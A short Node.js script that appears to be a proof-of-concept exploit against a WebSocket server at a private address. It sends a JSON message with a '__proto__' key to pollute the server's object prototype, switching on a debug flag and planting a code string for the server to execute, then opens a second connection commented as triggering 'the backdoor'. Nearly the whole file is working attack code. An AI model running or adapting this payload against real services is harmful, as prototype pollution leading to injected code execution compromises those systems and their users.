const WebSocket = require("ws");


let ws = new WebSocket.WebSocket("ws://10.0.0.109:4567")

ws.on("open", () => {
    console.log("start")
    // pullute the {}
    ws.send('{"__proto__": { "debug": true,"debugCommend":"socket.send(\'I am be controled\')"}}')
});
ws.on('message', (message) => {
    console.log('execute');
    console.log(String(message));
})
setTimeout(() => {
    let ws2 = new WebSocket.WebSocket("ws://10.0.0.109:4567")
    //trigger the backdoor
    ws2.on("open", () => {
        console.log("start")
        // pullute the {}
        ws.send(JSON.stringify({ tag: 'hack' }))
    });
}, 2000);
